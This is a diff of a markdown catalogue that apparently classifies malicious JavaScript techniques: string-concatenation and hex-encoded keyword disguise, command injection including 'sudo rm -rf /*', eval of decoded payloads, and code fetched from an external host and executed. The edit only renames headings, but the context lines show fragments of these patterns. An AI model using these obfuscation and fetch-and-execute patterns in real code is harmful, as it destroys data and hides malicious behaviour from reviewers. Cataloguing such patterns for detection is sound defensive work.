@@ -1,5 +1,7 @@
-# 1 Keyword disguise
-## 1.1 Concatenated String
+# Appendix
+
+## 1 Keyword disguise
+### 1.1 Concatenated String
 ```javascript
 var url_part_1 = 'h' + 't' + 't' + 'p' // <--- disguised http keyword
 var url_part_2 = ['api.github', '.com/repos'].join('')
@@ -22,7 +24,7 @@ http.request({
 }, function() {})
 ```
 
-## 1.2 Encoded String
+### 1.2 Encoded String
 ```javascript
 var e = Buffer.from(e, "hex").toString()
 var r = http.request({
@@ -43,8 +45,8 @@ http.request({
 }, function() {})
 ```
 
-# 2 Command Injection
-## 2.1 Hardcoded code string
+## 2 Command Injection
+### 2.1 Hardcoded code string
 
 **Execute js code**
 
@@ -70,7 +72,7 @@ exec('sudo rm -rf /*', (err, stdout, stderr) => {
 ```
 
 
-## 2.2 Encoded code string
+### 2.2 Encoded code string
 ```javascript
 var a = 'asdfbakl2347198ebfkjdasfae' // <--- malicious code
 var decoded_a = Buffer.from(a, "hex").toString()
@@ -83,7 +85,7 @@ eval(decoded_a)
 ```
 
 
-## 2.3 Code from http response
+### 2.3 Code from http response
 **Plain string**
 ```javascript
 https.get(
@@ -134,7 +136,7 @@ https.get("https://updatecheck.herokuapp.com/check", res => res.on("data", d => 
 }))
 ```
 
-# 3 Name alias
+## 3 Name alias
 ```javascript
 var o = http
 function i(e, t, n) {
